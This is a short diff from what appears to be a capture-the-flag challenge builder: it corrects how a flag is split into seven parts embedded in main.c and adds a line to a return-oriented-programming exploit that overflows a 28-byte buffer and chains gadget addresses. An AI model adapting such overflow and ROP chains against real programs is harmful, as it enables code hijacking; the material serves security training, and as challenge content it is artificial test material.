@@ -22,16 +22,18 @@ f = open("flag.txt", "r")
 flag=f.readline()
 flag1=flag[:10]
 flag2=flag[10:20]  
-flag3=flag[30:40]  
-flag4=flag[40:50]  
-flag5=flag[50:60]  
-flag6=flag[60:]  
+flag3=flag[20:30]  
+flag4=flag[30:40]  
+flag5=flag[40:50]  
+flag6=flag[50:60]  
+flag7=flag[60:]  
 replace_text("main.c", "FLAG_PART_1", flag1)
 replace_text("main.c", "FLAG_PART_2", flag2)
 replace_text("main.c", "FLAG_PART_3", flag3)
 replace_text("main.c", "FLAG_PART_4", flag4)
 replace_text("main.c", "FLAG_PART_5", flag5)
 replace_text("main.c", "FLAG_PART_6", flag6)
+replace_text("main.c", "FLAG_PART_7", flag7)
 replace_text_random_hash("main.c", "FLAG_WRONG")
 
 
@@ -55,6 +57,7 @@ padding = b'A' * 28
 exploit = padding + p32(FLAG1) + p32(FLAG2) + p32(POP_ONCE) + p32(0xAABBCCD2)
 exploit += p32(XOR) + p32(FLAG3) + p32(POP_ONCE) + p32(0xAABBCCD1) + p32(FLAG3) 
 exploit += p32(POP_ONCE) + p32(0xAABBCCD2) + p32(XOR2) + p32(FLAG3) +p32(POP_ONCE) 
+exploit += p32(0xAABBCCD5) + p32(XOR3) + p32(FLAG2) + p32(POP_ONCE)
 exploit += p32(0xAABBCCD5) + p32(XOR3) + p32(FLAG6) + p32(POP_ONCE) + p32(0xBBCCDDE9) + p32(0xBBCCDDE3)
 
 # rop is saved as input
